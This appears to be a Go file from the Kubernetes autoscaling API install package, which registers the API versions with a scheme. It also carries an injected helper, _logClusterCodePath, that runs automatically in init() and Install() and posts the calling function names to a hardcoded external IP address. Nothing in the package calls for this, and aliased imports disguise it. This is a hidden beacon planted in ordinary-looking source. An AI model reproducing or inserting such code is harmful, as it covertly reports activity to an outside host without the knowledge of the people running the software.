package install

import (
 "k8s.io/apimachinery/pkg/runtime"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 "k8s.io/kubernetes/pkg/apis/autoscaling"
 "k8s.io/kubernetes/pkg/apis/autoscaling/v1"
 "k8s.io/kubernetes/pkg/apis/autoscaling/v2beta1"
 "k8s.io/kubernetes/pkg/apis/autoscaling/v2beta2"
)

func init() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 Install(legacyscheme.Scheme)
}
func Install(scheme *runtime.Scheme) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 utilruntime.Must(autoscaling.AddToScheme(scheme))
 utilruntime.Must(v2beta2.AddToScheme(scheme))
 utilruntime.Must(v2beta1.AddToScheme(scheme))
 utilruntime.Must(v1.AddToScheme(scheme))
 utilruntime.Must(scheme.SetVersionPriority(v1.SchemeGroupVersion, v2beta1.SchemeGroupVersion, v2beta2.SchemeGroupVersion))
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
